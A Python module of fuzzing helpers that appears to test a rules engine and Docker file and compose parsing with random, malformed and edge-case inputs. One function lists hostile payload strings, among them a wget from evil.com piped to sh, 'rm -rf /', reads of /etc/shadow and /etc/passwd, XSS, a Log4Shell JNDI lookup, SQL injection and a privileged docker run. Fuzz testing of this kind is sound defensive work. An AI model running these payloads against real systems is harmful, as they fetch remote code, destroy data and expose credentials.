import random
import string


def random_string(length=None):
    if length is None:
        length = random.randint(0, 1000)
    return "".join(
        random.choices(
            string.ascii_letters + string.digits + string.punctuation + " \n\t\r",
            k=length,
        )
    )


def random_path():
    return f"/{random_string(10)}/{random_string(10)}.txt"


def random_dict():
    return {random_string(5): random_string(10) for _ in range(random.randint(0, 10))}


def get_hybrid_param(predefined, generator_fn=None):
    """
    50% chance to return 'predefined', 50% chance to return 'fuzzed'.
    If generator_fn is provided, it is used for fuzzing.
    """
    if random.random() > 0.5:
        return predefined

    if generator_fn:
        return generator_fn()

    # Generic fuzzer if no generator provided
    return random.choice([None, "", 0, 1, -1, {}, [], random_string(50)])


def hybrid_context(predefined):
    """Specific fuzzer for RulesEngine context dictionaries."""
    if random.random() > 0.5:
        return predefined

    fuzzed = predefined.copy()
    # Randomly corrupt or remove keys
    for key in list(fuzzed.keys()):
        if random.random() > 0.2:
            fuzzed[key] = random.choice([None, "", random_string(20), 12345, [], {}])
    # Add garbage keys
    for _ in range(random.randint(0, 5)):
        fuzzed[random_string(5)] = random_string(10)
    return fuzzed


def random_garbage(depth=2):
    """
    Generate truly chaotic data - recursive mix of None, int, float,
    bool, str, list, dict. Designed to trigger AttributeError/TypeError
    in code that assumes specific types.
    """
    if depth <= 0:
        return random.choice(
            [
                None,
                "",
                0,
                -1,
                99999,
                3.14,
                -0.001,
                True,
                False,
                float("inf"),
                float("-inf"),
                float("nan"),
                random_string(random.randint(0, 500)),
                b"raw bytes",
                [],
                {},
                (),
                set(),
            ]
        )

    kind = random.choice(
        [
            "none",
            "int",
            "float",
            "bool",
            "str",
            "bytes",
            "list",
            "dict",
            "tuple",
            "set",
            "nested_dict",
            "nested_list",
        ]
    )
    if kind == "none":
        return None
    elif kind == "int":
        return random.choice([0, -1, 1, 2**31, -(2**31), 999999999])
    elif kind == "float":
        return random.choice([0.0, -1.0, 3.14, float("inf"), float("nan")])
    elif kind == "bool":
        return random.choice([True, False])
    elif kind == "str":
        return random_string(random.randint(0, 2000))
    elif kind == "bytes":
        return b"\x00\xff" * random.randint(1, 50)
    elif kind == "list":
        return [random_garbage(depth - 1) for _ in range(random.randint(0, 5))]
    elif kind == "dict":
        return {
            random_string(3): random_garbage(depth - 1)
            for _ in range(random.randint(0, 5))
        }
    elif kind == "tuple":
        return tuple(random_garbage(depth - 1) for _ in range(random.randint(0, 3)))
    elif kind == "set":
        return set()
    elif kind == "nested_dict":
        return {
            random_string(3): {
                random_string(2): random_garbage(depth - 1)
                for _ in range(random.randint(1, 3))
            }
            for _ in range(random.randint(1, 3))
        }
    elif kind == "nested_list":
        return [[random_garbage(depth - 1)] for _ in range(random.randint(1, 4))]
    return None


def edge_case_payloads():
    """
    Returns specific, highly-structured but malicious/edge-case strings
    (e.g., XSS, path traversal, shell injection, format strings).
    """
    return random.choice(
        [
            "../../../etc/shadow",
            "$(cat /etc/passwd)",
            "`rm -rf /`",
            "; wget http://evil.com/sh.sh -O- | sh;",
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "'\"><img src=x onerror=alert(1)>",
            "%s%s%s%s%s%s%s%s%s",
            "A" * 10000,
            "\\x00" * 50,
            "\u200b\u200c\u200d\ufeff",  # Zero-width whitespace characters
            "\\\\server\\share\\path",
            "C:\\Windows\\System32\\cmd.exe",
            "../../../../../../../../../../../../etc/passwd",
            "${jndi:ldap://evil.com/x}",
            "__proto__[isAdmin]=true",
            "{{7*7}}",
            "1; DROP TABLE users",
            "docker run -ti --privileged ubuntu bash -c 'echo pwned'",
        ]
    )


def extreme_dockerfile_lines():
    """Generate syntactically weird but theoretically valid (or parsing-crashing) dockerfile lines."""
    return random.choice(
        [
            "FROM " + "A" * 500,
            "ENV " + random_string(10) + "=" + "B" * 5000,
            "RUN " + " && ".join(["echo " + str(i) for i in range(100)]),
            'COPY ["' + '"] ["'.join([random_string(50) for _ in range(20)]) + '"]',
            "ONBUILD " * 10 + " RUN echo hi",
            "HEALTHCHECK --interval=1s --timeout=1s --start-period=1s --retries=99999999 CMD exit 1",
            "#" + "A" * 10000,  # massive comment
            "LABEL " + " ".join([f"k{i}=v{i}" for i in range(50)]),
            "USER \\x00root\\x00",
            "EXPOSE " + " ".join([str(i) for i in range(1, 65535, 1000)]),
        ]
    )


def extreme_yaml_blocks():
    """Generate weird YAML to fuzz compose/swarm parsing."""
    return random.choice(
        [
            "&a" * 100 + " [*a]",  # Billion laughs attempt
            "version: '" + "9" * 10 + ".0'",
            "services:\n  " + "A" * 1000 + ":\n    image: nginx",
            "volumes:\n  - " + ":".join([random_string(10) for _ in range(50)]),
            "networks:\n  "
            + "\n  ".join([f"net{i}:\n    driver: bridge" for i in range(100)]),
            "secrets:\n  "
            + "\n  ".join([f"sec{i}:\n    external: true" for i in range(50)]),
        ]
    )
